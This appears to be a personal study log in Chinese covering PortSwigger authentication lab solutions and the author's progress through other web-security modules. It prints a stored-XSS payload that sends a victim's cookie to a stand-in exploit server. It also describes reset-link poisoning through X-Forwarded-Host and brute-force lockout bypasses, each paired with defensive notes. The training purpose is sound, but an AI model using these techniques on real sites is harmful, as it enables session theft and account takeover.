评论区存储型 XSS → carlos 浏览评论时 `document.location='//exploit-server/'+document.cookie` 把 cookie 送到 exploit server 的 Access log → 解码得 `carlos:md5哈希` → 离线破解（hashcat -m 0 / 在线反查）→ 明文密码 → 登录删账户。

认知：偷到的 remember-me cookie 本身就能登录（会话接管）；破解出明文是"长期资产"（密码复用/横向移动）。MD5 无盐 = 明文等价物；正确实现是随机 token + 服务端存储。

### 密码重置投毒：X-Forwarded-Host 控制重置链接（Authentication Lab 11）

重置密码的邮件链接里 token 是安全的（随机、绑定目标用户），但**链接域名**由 `X-Forwarded-Host` 头拼接且未校验 → 加 `X-Forwarded-Host: exploit-server` 再给 carlos 发重置请求，carlos 点击邮件链接 → token 出现在 exploit server 日志（`/forgot-password?temp-forgot-password-token=xxx`）→ 拿自己 wiener 的合法重置链接换掉 token 参数 → 打开重置页给 carlos 设新密码 → 登录过关。

认知：这是 Host header 注入的经典场景（密码重置投毒），真实世界常见于反代/中间件后面用 `X-Forwarded-Host`/`Forwarded` 生成绝对 URL 的应用；防御 = 生成链接用白名单域名，不信任任何客户端可控头。

### 改密接口爆破：新密码不一致绕过锁定（Authentication Lab 12）

改密接口里"当前密码错误"的锁定条件**绑定了两次新密码是否一致**：一致才锁，不一致只报错。故意把两个新密码填成不同值 → 错误当前密码永远不触发锁定；且当前密码正确时返回的文案不同（`New passwords do not match`），直接当命中信号。隐藏字段 `username` 可改成目标用户。缺陷代码还原见 [2026-08-14 改密爆破与单请求多凭据](./2026-08-14-改密接口爆破与单请求多凭据.md)。

### 单请求多凭据：JSON 数组压缩爆破（Authentication Lab 13 EXPERT）

登录接口 JSON 的 `password` 字段类型未校验，服务端把它当"凭据集合"遍历：传数组 = 一次请求带整本字典。**防护按"请求"计数（错 100 个只算 1 次失败），业务按"元素"处理（逐个验证）→ 计数粒度不一致 = 绕过**。换 IP/UA 没用（锁定按账号维度计数）。缺陷代码还原见 [2026-08-14 改密爆破与单请求多凭据](./2026-08-14-改密接口爆破与单请求多凭据.md)。

---

## 下一阶段

- **SQL 注入模块 已通关（18/18，2026-09-23 收官）**：盲注四代信道 + WAF 编码绕过见 [2026-09-23 笔记](./2026-09-23-PortSwigger-SQL注入盲注四信道与WAF编码绕过.md)
- **文件上传模块进行中（4/7）**：下一关 = Lab 5 Web shell upload via obfuscated file extension（混淆扩展名，玩**空字节截断**），然后 Lab 6 polyglot 图片马、Lab 7 race condition
- **SSRF 模块进行中（5/7）**：剩 2 关 = 第 6 关 Blind SSRF with Shellshock （盲打 + `User-Agent` 注入 Shellshock → RCE）、第 7 关 SSRF with whitelist-based input filter（EXPERT，白名单绕过 `@`/`#`/`?` 解析差异）
- **CSRF 暂停（4/11）**：下一关 = CSRF where token is tied to non-session cookie；另待补第 3 关的对照实验（POST + 删 csrf 是否通过）
- **XSS 模块进行中（7/30）**：下一道 = Stored XSS into anchor href attribute with double quotes HTML-encoded（#8，payload 用 `javascript:`）
- **Authentication 收尾**：剩 1 道 —— 2FA bypass using a brute-force attack（Lab 14，EXPERT，关键 = Burp Macro + Session handling rule）
- **XXE 进行中（2/9）**：Lab 3/4/5 盲打三连待做（需要 Collaborator / exploit server 收外带请求）
